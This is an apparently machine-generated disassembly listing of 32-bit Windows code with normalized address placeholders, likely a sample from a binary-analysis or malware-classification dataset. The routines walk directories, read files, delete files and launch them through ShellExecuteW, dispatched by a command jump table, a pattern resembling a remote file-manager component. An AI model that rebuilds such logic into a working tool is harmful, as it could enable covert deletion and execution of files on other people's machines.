add esp 0x4
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x14 ] ebx
call sub_10008c8d
push r--data
lea ecx [ ebp - 0x2c ]
push ecx
mov [ ebp - 0x2c ] r--data
call sub_10009ef4
mov [ esi ] eax
xor ecx ecx
mov [ eax ] ecx
xor edx edx
mov [ eax + 0x4 ] edx
mov ecx [ esi ]
mov [ ecx ] esi
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ esi + 0x10 ] ebx
mov [ ebp - 0x4 ] 0x1
lea esi [ edi + 0x3c ]
push 0x8
mov [ esi ] ebx
call sub_10008d9c
add esp 0x4
cmp eax ebx
je r-xdata
lea ecx [ ebp - 0x10 ]
push ecx
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x10 ] ebx
call sub_10008c8d
push r--data
lea edx [ ebp - 0x20 ]
push edx
mov [ ebp - 0x20 ] r--data
call sub_10009ef4
mov [ esi ] eax
xor edx edx
mov [ eax + 0x4 ] edx
xor ecx ecx
mov [ eax ] ecx
mov edx [ esi ]
mov [ edx ] esi
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ esi + 0x10 ] ebx
mov [ ebp - 0x4 ] 0x2
push 0x24
mov [ edi + 0x8 ] 0x1400000
call sub_10008d9c
add esp 0x4
cmp eax ebx
je r-xdata
xor eax eax
mov [ eax + 0x18 ] 0xf
mov [ eax + 0x14 ] ebx
mov [ eax + 0x4 ] bl
jmp r-xdata
mov [ edi + 0x54 ] eax
mov ecx 0x1101
mov [ eax ] cx
mov ecx [ edi + 0x54 ]
add ecx 0x4
mov esi 0x5
mov eax r--data
call sub_10002000
mov edx [ edi + 0x54 ]
mov [ edx + 0x20 ] 0x1
mov eax [ edi + 0x54 ]
mov [ eax + 0x21 ] bl
mov [ edi + 0x4 ] ebx
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_10007710
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor al al
pop ebp
retn 0x4
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ecx + 0x3c ]
call sub_10005630
mov al 0x1
pop ebp
retn 0x4
sub_10007740
push ebp
mov ebp esp
sub esp 0x1c
push ebx
push esi
push edi
mov edi ecx
xor ebx ebx
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] ebx
cmp [ edi + 0x1c ] ebx
je r-xdata
cmp [ edi + 0x34 ] ebx
je r-xdata
mov eax [ edi + 0x58 ]
cmp eax ebx
je r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x10
call sub_10008d9c
add esp 0x4
cmp eax ebx
je r-xdata
mov eax [ edi + 0x4 ]
mov esi [ edi + 0x1c ]
push 0x1
push eax
call sub_100091bb
add esp 0x8
mov [ ebp - 0xc ] eax
cmp eax ebx
je r-xdata
push ebx
push eax
call [ WaitForSingleObject@IAT ]
cmp eax ebx
je r-xdata
add edi 0x24
lea eax [ ebp - 0x1c ]
mov ecx edi
mov [ ebp - 0x10 ] edi
call sub_100056e0
mov ecx [ eax ]
cmp ecx ebx
jne r-xdata
mov ecx 0xffff
mov [ eax ] cx
mov [ eax + 0x2 ] 0xff
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ebx
mov [ eax + 0xc ] ebx
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov ebx eax
test esi esi
je r-xdata
mov edx [ ecx ]
xor edx edx
jmp r-xdata
mov esi [ edi + 0x4 ]
push 0x1
push esi
call sub_100091bb
mov edi eax
xor ebx ebx
add esp 0x8
cmp edi ebx
je r-xdata
mov [ ebp - 0x8 ] esi
lea esp [ esp ]
mov edx [ edx + 0x4 ]
mov eax [ edx + eax * 4 ]
mov edi [ eax + ecx * 4 ]
mov esi [ edi + 0xc ]
push 0x1
push esi
call sub_100091bb
mov ebx eax
add esp 0x8
test ebx ebx
je r-xdata
sub eax esi
mov ecx [ eax + 0x8 ]
mov esi [ edx + 0x8 ]
mov eax ecx
shr eax 0x2
and ecx 0x3
cmp esi eax
ja r-xdata
mov eax [ ebp - 0xc ]
push ebx
push ebx
push esi
push edi
shr esi 0x1
push esi
push eax
push ebx
push 0xfde9
call [ WideCharToMultiByte@IAT ]
push 0x10
mov [ ebp - 0x10 ] eax
call sub_10008d9c
add esp 0x4
cmp eax ebx
je r-xdata
mov edx [ ecx ]
xor edx edx
jmp r-xdata
mov ecx [ edi + 0x8 ]
push esi
push ecx
push ebx
call sub_1000a7c0
push 0x10
call sub_10008d9c
xor esi esi
add esp 0x10
cmp eax esi
je r-xdata
xor esi esi
mov ecx 0xffff
mov [ eax ] cx
mov [ eax + 0x2 ] 0xff
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ebx
mov [ eax + 0xc ] ebx
mov esi eax
jmp r-xdata
mov edx [ edx + 0x4 ]
mov eax [ edx + eax * 4 ]
mov esi [ eax + ecx * 4 ]
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
push ecx
push edx
push ebx
call sub_1000a7c0
mov eax [ edi + 0x1c ]
add ebx [ esi + 0x4 ]
xor edx edx
add esp 0xc
cmp eax edx
je r-xdata
sub eax esi
mov ecx [ eax + 0x8 ]
mov esi [ edx + 0x8 ]
mov eax ecx
shr eax 0x2
and ecx 0x3
cmp esi eax
ja r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ecx ]
mov edx [ eax + 0xc ]
mov [ ebp - 0x8 ] esi
call edx
xor edx edx
mov [ esi ] ax
mov [ esi + 0x2 ] 0x2
mov eax [ edi + 0xc ]
cmp [ esi + 0x8 ] edx
jne r-xdata
mov edx 0xffff
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] esi
mov [ eax + 0xc ] esi
mov [ eax ] dx
mov [ eax + 0x2 ] 0xff
mov esi eax
mov edx [ ebp - 0xc ]
push edx
mov [ ebx + 0x4 ] 0x0
call sub_10009181
mov eax [ ebx + 0x58 ]
add esp 0x4
push eax
call [ ReleaseMutex@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] ecx
mov ebx [ ebp - 0x4 ]
mov edx [ ebx ]
mov eax [ edx + 0xc ]
mov ecx ebx
mov [ ebp - 0x8 ] esi
call eax
cmp [ esi + 0x8 ] 0x0
mov [ esi ] ax
mov [ esi + 0x4 ] 0xd
mov [ esi + 0x2 ] 0x0
jne r-xdata
dec [ ebp - 0x8 ]
jne r-xdata
mov esi [ edi + 0x14 ]
inc [ edi + 0x18 ]
add esi esi
add esi esi
cmp esi [ edi + 0x18 ]
ja r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x10 ]
cmp ecx edx
je r-xdata
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] eax
lea ecx [ ebp - 0x10 ]
push ecx
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x10 ] r--data
call sub_10008c8d
push r--data
lea edx [ ebp - 0x1c ]
push edx
call sub_10009ef4
lea eax [ ebp - 0x1c ]
lea ecx [ edi + 0xc ]
call sub_100056e0
mov ecx [ eax ]
test ecx ecx
jne r-xdata
dec eax
mov [ edi + 0x1c ] eax
cmp eax edx
jne r-xdata
mov [ edi + 0x18 ] edx
mov eax [ edi + 0x8 ]
cmp eax edx
je r-xdata
mov ebx [ eax + 0x8 ]
inc [ eax + 0xc ]
add ebx ebx
add ebx ebx
cmp ebx [ eax + 0xc ]
ja r-xdata
mov [ edi + 0x18 ] edx
push edi
call sub_10008d40
add esp 0x4
push eax
call sub_10009181
add esp 0x4
dec ecx
mov [ eax + 0x10 ] ecx
cmp ecx edx
jne r-xdata
mov [ eax + 0xc ] edx
mov [ eax + 0xc ] edx
sub_10007a00
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
push 0x0
push 0x0
push 0x0
mov ebx ecx
call [ CreateMutexW@IAT ]
mov [ ebx + 0x58 ] eax
test eax eax
jne r-xdata
mov esi [ Sleep@IAT ]
push 0x14
call esi
cmp [ ebx + 0x4c ] 0x0
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] r--data
call sub_10008c8d
push r--data
lea ecx [ ebp - 0x10 ]
push ecx
call sub_10009ef4
nop
push 0x14
call esi
jmp r-xdata
lea eax [ ebp - 0x10 ]
lea ecx [ ebx + 0x3c ]
call sub_100056e0
mov ecx [ eax ]
test ecx ecx
jne r-xdata
mov edx [ ecx ]
xor edx edx
jmp r-xdata
mov edx [ edx + 0x4 ]
mov eax [ edx + eax * 4 ]
mov edi [ eax + ecx * 4 ]
mov ecx [ edi + 0xc ]
movzx edx [ edi + 0x2 ]
push ecx
push edx
mov edx [ edi + 0x8 ]
mov ecx ebx
call sub_10007af0
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
sub eax edi
mov ecx [ eax + 0x8 ]
mov edi [ edx + 0x8 ]
mov eax ecx
shr eax 0x2
and ecx 0x3
cmp edi eax
ja r-xdata
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebx + 0x44 ]
inc [ ebx + 0x48 ]
add edx edx
add edx edx
cmp edx [ ebx + 0x48 ]
ja r-xdata
push edi
call sub_10008d40
add esp 0x4
jmp r-xdata
push eax
call sub_10009181
add esp 0x4
dec eax
mov [ ebx + 0x4c ] eax
jne r-xdata
mov [ ebx + 0x48 ] 0x0
mov [ ebx + 0x48 ] 0x0
sub_10007af0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x23c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x238 ] eax
push ebx
push esi
mov esi ecx
mov eax [ esi + 0x58 ]
xor ecx ecx
mov ebx edx
push edi
mov edi [ ebp + 0xc ]
mov [ esp + 0x18 ] esi
mov [ esp + 0x20 ] ebx
cmp eax ecx
je r-xdata
movzx eax [ ebp + 0x8 ]
dec eax
cmp eax 0x4
ja r-xdata
push 0xffffffff
push eax
call [ WaitForSingleObject@IAT ]
xor ecx ecx
push 0x8
call sub_10008d9c
xor edi edi
add esp 0x4
cmp eax edi
je r-xdata
jmp [ eax * 4 + jump_table_1000804c ]
push 0x1
mov ebx 0x68
push ebx
mov [ esp + 0x24 ] edi
call sub_100091bb
push ebx
push r--data
push eax
mov [ edi ] eax
call sub_1000a7c0
add esp 0x14
lea edx [ esp + 0x1c ]
push edx
lea eax [ esi + 0xc ]
mov [ edi + 0x4 ] ebx
call sub_10005630
mov eax [ esi + 0x58 ]
add [ esi + 0x4 ] ebx
push eax
call [ ReleaseMutex@IAT ]
test eax eax
jne r-xdata
mov [ eax ] edi
mov [ eax + 0x4 ] edi
mov edi eax
mov [ esp + 0x14 ] ecx
cmp edi ecx
je r-xdata
mov [ esp + 0x14 ] ecx
cmp edi ecx
je r-xdata
mov [ esp + 0x14 ] ecx
cmp edi ecx
je r-xdata
mov [ esp + 0x14 ] ecx
cmp edi ecx
je r-xdata
mov [ esp + 0x14 ] ecx
cmp edi ecx
je r-xdata
mov ecx [ esp + 0x244 ]
pop edi
pop esi
pop ebx
xor ecx esp
xor al al
call sub_10008bf6
mov esp ebp
pop ebp
retn 0x8
lea ecx [ esp + 0x24 ]
push ecx
lea ecx [ esp + 0x30 ]
mov [ esp + 0x28 ] r--data
call sub_10008c8d
push r--data
lea edx [ esp + 0x30 ]
push edx
call sub_10009ef4
mov ecx [ esp + 0x18 ]
mov edx [ ecx + 0x58 ]
push edx
call [ ReleaseMutex@IAT ]
test eax eax
jne r-xdata
push edi
push ebx
lea ecx [ esp + 0x1c ]
call sub_10008900
mov ebx eax
mov [ esp + 0x10 ] ebx
test ebx ebx
je r-xdata
push edi
push ebx
lea ecx [ esp + 0x1c ]
call sub_10008900
mov ebx eax
mov [ esp + 0x10 ] ebx
test ebx ebx
je r-xdata
push edi
push ebx
lea ecx [ esp + 0x1c ]
call sub_10008900
mov ebx eax
mov [ esp + 0x1c ] ebx
test ebx ebx
je r-xdata
push edi
push ebx
lea ecx [ esp + 0x1c ]
call sub_10008900
mov esi eax
test esi esi
je r-xdata
push edi
push ebx
lea ecx [ esp + 0x1c ]
call sub_10008900
mov ebx eax
mov [ esp + 0x10 ] ebx
test ebx ebx
je r-xdata
mov al 0x1
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x238 ]
xor ecx esp
call sub_10008bf6
mov esp ebp
pop ebp
retn 0x8
lea eax [ esp + 0x1c ]
push eax
lea ecx [ esp + 0x30 ]
mov [ esp + 0x20 ] r--data
call sub_10008c8d
push r--data
lea ecx [ esp + 0x30 ]
push ecx
call sub_10009ef4
mov edi [ esp + 0x14 ]
cmp edi 0x3
je r-xdata
mov edi [ esp + 0x14 ]
cmp edi 0x3
je r-xdata
mov eax [ esp + 0x14 ]
cmp eax 0x3
jae r-xdata
mov ebx [ esp + 0x14 ]
cmp ebx 0x3
je r-xdata
mov edi [ esp + 0x14 ]
cmp edi 0x3
je r-xdata
push r--data
mov edi 0xe
mov ebx esi
call sub_100089d0
mov ecx [ esp + 0x10 ]
mov edx [ ecx + 0x8 ]
push 0x1
push r--data
push edx
call sub_10009b24
add esp 0xc
test eax eax
mov eax [ esp + 0x10 ]
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
push 0x0
jne r-xdata
xor esi esi
test edi edi
je r-xdata
push r--data
mov edi 0xe
mov ebx esi
call sub_100089d0
mov edx [ esp + 0x10 ]
mov eax [ edx + 0x8 ]
push 0x2
push r--data
push eax
call sub_10009c28
add esp 0xc
test eax eax
mov eax [ esp + 0x10 ]
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
push 0x1
jne r-xdata
xor esi esi
test edi edi
je r-xdata
mov eax [ ebx ]
mov [ esp + 0x28 ] eax
lea edx [ eax + 0x2 ]
xor esi esi
test eax eax
je r-xdata
mov ebx [ esp + 0x18 ]
push r--data
mov edi 0xe
call sub_100089d0
mov ecx [ esi + 0x8 ]
push 0x2
push r--data
push ecx
call sub_10009c28
add esp 0xc
push 0x2
test eax eax
jne r-xdata
xor edi edi
test ebx ebx
je r-xdata
push r--data
mov edi 0xe
mov ebx esi
call sub_100089d0
mov edx [ esp + 0x10 ]
mov eax [ edx + 0x8 ]
push 0x2
push r--data
push eax
call sub_10009c28
add esp 0xc
test eax eax
mov eax [ esp + 0x10 ]
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
push 0x3
jne r-xdata
xor esi esi
test edi edi
je r-xdata
push 0x0
push 0x1
jmp r-xdata
lea ecx [ ecx ]
push 0x0
push 0x1
jmp r-xdata
mov ecx [ ebx + esi * 4 ]
push ecx
call sub_10009181
inc esi
add esp 0x4
cmp esi edi
jb r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
mov ebx [ ebx + 0x4 ]
sub eax edx
sar eax 0x1
mov edx eax
mov eax ebx
lea ecx [ eax + 0x2 ]
mov [ esp + 0x10 ] ecx
mov edi edi
mov ecx [ ebx + esi * 4 ]
push ecx
call sub_10009181
inc esi
add esp 0x4
cmp esi [ esp + 0x14 ]
jb r-xdata
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
push 0x0
push ecx
push edx
mov edx [ esi + 0x4 ]
mov eax [ esi ]
push 0x1
push edx
push eax
jmp r-xdata
lea ebx [ ebx ]
push 0x0
push 0x1
jmp r-xdata
nop
mov eax [ edi + esi * 4 ]
push eax
call sub_10009181
inc esi
add esp 0x4
cmp esi 0x3
jb r-xdata
jmp r-xdata
push ecx
push edx
mov ecx esi
call sub_10008060
push r--data
mov edi 0x78
call sub_100089d0
mov edi [ esp + 0x10 ]
xor esi esi
mov eax [ ebx + esi * 4 ]
push eax
call sub_10009181
inc esi
add esp 0x4
cmp esi edi
jb r-xdata
jmp r-xdata
mov eax [ edi + esi * 4 ]
push eax
call sub_10009181
inc esi
add esp 0x4
cmp esi 0x3
jb r-xdata
jmp r-xdata
push ecx
push edx
mov ecx esi
call sub_10008060
push r--data
mov edi 0x78
call sub_100089d0
mov edi [ esp + 0x10 ]
xor esi esi
jmp r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax [ esp + 0x10 ]
push 0x206
sar eax 0x1
add eax edx
lea edx [ eax + eax + 0x2 ]
xor eax eax
push eax
lea ecx [ esp + 0x42 ]
push ecx
mov [ esp + 0x1c ] edx
mov [ esp + 0x44 ] ax
call sub_1000a740
mov edx [ esp + 0x34 ]
add esp 0xc
push ebx
push edx
push r--data
mov ecx 0x104
lea ebx [ esp + 0x44 ]
call sub_10002600
mov eax [ esp + 0x1c ]
mov ecx [ esp + 0x2c ]
sub edi eax
add esp 0xc
push edi
add ecx eax
push ecx
mov eax ebx
mov edi esi
call sub_10008850
push r--data
mov edi 0x68
mov ebx esi
call sub_100089d0
xor esi esi
cmp [ esp + 0x14 ] esi
jbe r-xdata
jmp r-xdata
mov eax [ esi + edi * 4 ]
push eax
call sub_10009181
inc edi
add esp 0x4
cmp edi 0x3
jb r-xdata
jmp r-xdata
mov ecx ebx
call sub_10008060
push r--data
mov edi 0x78
call sub_100089d0
xor edi edi
mov edi edi
mov eax [ esi + edi * 4 ]
push eax
call sub_10009181
inc edi
add esp 0x4
cmp edi ebx
jb r-xdata
jmp r-xdata
mov eax [ edi + esi * 4 ]
push eax
call sub_10009181
inc esi
add esp 0x4
cmp esi 0x3
jb r-xdata
push ecx
push edx
mov ecx esi
call sub_10008060
push r--data
mov edi 0x78
call sub_100089d0
mov edi [ esp + 0x10 ]
xor esi esi
mov edi edi
mov ecx [ ebx + esi * 4 ]
push ecx
call sub_10009181
inc esi
add esp 0x4
cmp esi edi
jb r-xdata
jmp r-xdata
mov ebx [ esp + 0x1c ]
mov edi [ esp + 0x14 ]
lea ecx [ ecx ]
mov edx [ ebx + esi * 4 ]
push edx
call sub_10009181
inc esi
add esp 0x4
cmp esi edi
jb r-xdata
jmp r-xdata
sub_10008060
push ebp
mov ebp esp
sub esp 0xac4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
push edi
xor eax eax
mov edi ecx
push 0x40e
push eax
lea ecx [ ebp - 0x826 ]
push ecx
mov [ ebp - 0xaa0 ] edi
mov [ ebp - 0xa9c ] ebx
mov [ ebp - 0xab4 ] esi
mov [ ebp - 0x828 ] ax
call sub_1000a740
add esp 0xc
xor edx edx
push 0x40e
push edx
lea eax [ ebp - 0x416 ]
push eax
mov [ ebp - 0x418 ] dx
call sub_1000a740
add esp 0xc
push esi
push ebx
push r--data
mov ecx 0x208
lea ebx [ ebp - 0x828 ]
call sub_10002600
add esp 0xc
lea ecx [ ebp - 0xa98 ]
push ecx
mov edx ebx
push edx
call [ FindFirstFileW@IAT ]
mov [ ebp - 0xaa8 ] eax
cmp eax 0xffffffff
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
mov al 0x1
pop ebx
call sub_10008bf6
mov esp ebp
pop ebp
retn 0x10
mov esi [ ebp - 0xa9c ]
push esi
push r--data
mov ecx 0x208
lea ebx [ ebp - 0x828 ]
call sub_10002600
add esp 0x8
lea eax [ ebp - 0xa98 ]
push eax
mov ecx ebx
push ecx
call [ FindFirstFileW@IAT ]
mov ebx eax
mov [ ebp - 0xaa8 ] ebx
cmp ebx 0xffffffff
je r-xdata
lea eax [ ebp - 0x848 ]
push eax
lea ecx [ ebp - 0xa8c ]
push ecx
call [ FileTimeToSystemTime@IAT ]
lea edx [ ebp - 0x838 ]
push edx
lea eax [ ebp - 0x848 ]
push eax
push 0x0
call [ SystemTimeToTzSpecificLocalTime@IAT ]
test [ ebp - 0xa98 ] 0x10
jne r-xdata
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
movzx eax [ ebp - 0x82e ]
mov edx [ ebp - 0xa9c ]
lea ecx [ ebp - 0xa6c ]
push ecx
movzx ecx [ ebp - 0x830 ]
push edx
movzx edx [ ebp - 0x838 ]
push eax
movzx eax [ ebp - 0x836 ]
push ecx
movzx ecx [ ebp - 0x832 ]
push edx
mov edx [ ebp - 0xa78 ]
push eax
push ecx
push edx
push r--data
mov ecx 0x208
lea ebx [ ebp - 0x418 ]
call sub_10002600
mov eax ebx
add esp 0x24
lea edx [ eax + 0x2 ]
test [ ebp - 0xa98 ] 0x10
je r-xdata
mov esi [ ebp - 0xaa8 ]
lea eax [ ebp - 0xa98 ]
push eax
push esi
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
movzx eax [ ebp - 0x82e ]
mov edx [ ebp - 0xa9c ]
lea ecx [ ebp - 0xa6c ]
push ecx
movzx ecx [ ebp - 0x830 ]
push edx
movzx edx [ ebp - 0x838 ]
push eax
movzx eax [ ebp - 0x836 ]
push ecx
movzx ecx [ ebp - 0x832 ]
push edx
mov edx [ ebp - 0xa78 ]
push eax
push ecx
push edx
push r--data
mov ecx 0x208
lea ebx [ ebp - 0x418 ]
call sub_10002600
mov eax ebx
add esp 0x24
lea edx [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
lea esi [ eax + eax ]
push 0x8
mov [ ebp - 0xab0 ] esi
call sub_10008d9c
xor ecx ecx
add esp 0x4
cmp eax ecx
je r-xdata
lea eax [ ebp - 0xa98 ]
push eax
push ebx
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
cmp [ ebp - 0xa6c ] 0x2e
je r-xdata
push esi
call [ FindClose@IAT ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push 0x8
lea esi [ eax + eax ]
call sub_10008d9c
xor ebx ebx
add esp 0x4
cmp eax ebx
je r-xdata
mov [ ebp - 0xaac ] ecx
mov ebx ecx
mov ebx eax
mov [ eax ] ecx
mov [ eax + 0x4 ] ecx
mov [ ebp - 0xaac ] ebx
jmp r-xdata
push ebx
call [ FindClose@IAT ]
lea edx [ ebp - 0x848 ]
push edx
lea eax [ ebp - 0xa8c ]
push eax
call [ FileTimeToSystemTime@IAT ]
lea ecx [ ebp - 0x838 ]
push ecx
lea edx [ ebp - 0x848 ]
push edx
push 0x0
call [ SystemTimeToTzSpecificLocalTime@IAT ]
lea eax [ ebp - 0xa6c ]
push eax
push esi
push r--data
mov ecx 0x208
lea ebx [ ebp - 0x828 ]
call sub_10002600
movzx edx [ ebp - 0x82e ]
movzx eax [ ebp - 0x830 ]
add esp 0xc
lea ecx [ ebp - 0xa6c ]
push ecx
movzx ecx [ ebp - 0x838 ]
push esi
push edx
movzx edx [ ebp - 0x836 ]
push eax
movzx eax [ ebp - 0x832 ]
push ecx
mov ecx [ ebp - 0xa78 ]
push edx
push eax
push ecx
push r--data
mov ecx 0x208
lea ebx [ ebp - 0x418 ]
call sub_10002600
mov eax ebx
add esp 0x24
lea edx [ eax + 0x2 ]
lea esp [ esp ]
push 0x1
push esi
mov [ ebp - 0xab0 ] ebx
call sub_100091bb
push esi
lea ecx [ ebp - 0x418 ]
push ecx
push eax
mov [ ebx ] eax
call sub_1000a7c0
add esp 0x14
lea edx [ ebp - 0xab0 ]
lea eax [ edi + 0xc ]
push edx
mov [ ebx + 0x4 ] esi
call sub_10005630
add [ edi + 0x4 ] esi
jmp r-xdata
mov [ eax ] ebx
mov [ eax + 0x4 ] ebx
mov ebx eax
mov edi [ ebx + 0x10 ]
add edi [ ebx + 0xc ]
mov eax [ ebx + 0x8 ]
mov esi edi
shr esi 0x2
cmp eax esi
ja r-xdata
add eax 0x4
shr eax 0x2
cmp [ ebx + 0x8 ] eax
ja r-xdata
push 0x1
push esi
call sub_100091bb
push esi
lea ecx [ ebp - 0x418 ]
push ecx
push eax
mov [ ebx ] eax
call sub_1000a7c0
mov [ ebx + 0x4 ] esi
mov eax [ edi + 0x1c ]
mov edx [ edi + 0x18 ]
lea ebx [ edi + 0xc ]
add edx eax
add esp 0x14
test dl 0x3
jne r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push 0x8
lea esi [ eax + eax ]
call sub_10008d9c
xor ebx ebx
add esp 0x4
cmp eax ebx
je r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + esi * 4 ] 0x0
jne r-xdata
sub esi eax
call sub_10005700
push 0x1
push esi
mov [ ebp - 0xaa4 ] ebx
call sub_100091bb
push esi
lea edx [ ebp - 0x418 ]
push edx
push eax
mov [ ebx ] eax
call sub_1000a7c0
add esp 0x14
lea ecx [ ebp - 0xaa4 ]
lea eax [ edi + 0xc ]
push ecx
mov [ ebx + 0x4 ] esi
call sub_10005630
mov edx [ ebp + 0x14 ]
mov eax [ ebp + 0x10 ]
mov ecx [ ebp - 0xab4 ]
add [ edi + 0x4 ] esi
push edx
push eax
push ecx
lea edx [ ebp - 0x828 ]
push edx
mov ecx edi
call sub_10008060
mov ebx [ ebp - 0xaa8 ]
mov esi [ ebp - 0xa9c ]
mov [ eax ] ebx
mov [ eax + 0x4 ] ebx
mov ebx eax
mov edx [ ebx + 0x4 ]
mov eax [ edx + esi * 4 ]
and edi 0x3
lea edi [ eax + edi * 4 ]
test edi edi
je r-xdata
push 0x10
call sub_10008d9c
add esp 0x4
test eax eax
je r-xdata
movzx eax [ ebp + 0x14 ]
inc [ ebx + 0x10 ]
mov edx [ ebp - 0xab0 ]
mov ecx [ ebp - 0xaa0 ]
add [ ecx + 0x4 ] edx
dec eax
je r-xdata
mov ecx [ ebp - 0xaac ]
mov [ edi ] ecx
lea ecx [ ebp - 0xaa4 ]
push ecx
lea ecx [ ebp - 0xac0 ]
mov [ ebp - 0xaa4 ] 0x0
call sub_10008c8d
push r--data
lea edx [ ebp - 0xac0 ]
push edx
mov [ ebp - 0xac0 ] r--data
call sub_10009ef4
int3
mov ecx [ ebx + 0x4 ]
mov [ ecx + esi * 4 ] eax
mov edx [ ebp - 0xa9c ]
lea eax [ ebp - 0xa6c ]
push eax
call sub_10008630
mov edi [ ebp - 0xaa0 ]
jmp r-xdata
dec eax
je r-xdata
mov ecx [ ebp - 0xa9c ]
lea eax [ ebp - 0xa6c ]
push eax
push ecx
push r--data
mov ecx 0x208
lea ebx [ ebp - 0x418 ]
call sub_10002600
add esp 0xc
mov edx ebx
push edx
call [ DeleteFileW@IAT ]
mov edi [ ebp - 0xaa0 ]
jmp r-xdata
dec eax
jne r-xdata
mov edi ecx
mov ecx [ ebp - 0xa9c ]
lea eax [ ebp - 0xa6c ]
push eax
push ecx
push r--data
mov ecx 0x208
lea ebx [ ebp - 0x418 ]
call sub_10002600
add esp 0xc
push 0x0
push 0x0
push 0x0
mov edx ebx
push edx
push r--data
push 0x0
call [ ShellExecuteW@IAT ]
mov edi [ ebp - 0xaa0 ]
jmp r-xdata
sub_10008630
push ebp
mov ebp esp
sub esp 0x218
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
xor eax eax
mov esi ecx
push 0x206
push eax
lea ecx [ ebp - 0x20a ]
push ecx
mov [ ebp - 0x214 ] esi
mov ebx edx
mov [ ebp - 0x20c ] ax
call sub_1000a740
push edi
push ebx
push r--data
mov ecx 0x104
lea ebx [ ebp - 0x20c ]
call sub_10002600
add esp 0x18
xor ebx ebx
push ebx
push 0x80
push 0x3
push ebx
push 0x3
push 0x80000000
lea edx [ ebp - 0x20c ]
push edx
call [ CreateFileW@IAT ]
mov [ ebp - 0x210 ] eax
cmp eax 0xffffffff
jne r-xdata
push ebx
push eax
call [ GetFileSize@IAT ]
mov ebx eax
cmp ebx [ esi + 0x8 ]
ja r-xdata
call [ GetLastError@IAT ]
push 0x8
cmp eax 0x20
jne r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10008bf6
mov esp ebp
pop ebp
retn 0x4
mov eax edi
lea edx [ eax + 0x2 ]
call sub_10008d9c
add esp 0x4
cmp eax ebx
je r-xdata
call sub_10008d9c
add esp 0x4
cmp eax ebx
je r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
lea edx [ ebx + eax * 2 + 0x1 ]
push 0x1
push edx
call sub_100091bb
mov esi eax
mov eax edi
add esp 0x8
lea edx [ eax + 0x2 ]
jmp r-xdata
xor edi edi
mov [ eax ] ebx
mov [ eax + 0x4 ] ebx
mov edi eax
jmp r-xdata
xor edi edi
mov [ eax ] ebx
mov [ eax + 0x4 ] ebx
mov edi eax
jmp r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
lea eax [ esi + 0xc ]
mov [ edi + 0x4 ] ebx
call sub_10005630
add [ esi + 0x4 ] ebx
push 0x1
mov ebx 0x62
push ebx
mov [ ebp - 0x210 ] edi
call sub_100091bb
push ebx
push r--data
push eax
mov [ edi ] eax
call sub_1000a7c0
add esp 0x14
lea ecx [ ebp - 0x210 ]
push ecx
jmp r-xdata
push 0x1
mov ebx 0x82
push ebx
mov [ ebp - 0x210 ] edi
call sub_100091bb
push ebx
push r--data
push eax
mov [ edi ] eax
call sub_1000a7c0
add esp 0x14
lea eax [ ebp - 0x210 ]
push eax
push 0x0
sub eax edx
push 0x0
sar eax 0x1
add eax eax
push eax
push esi
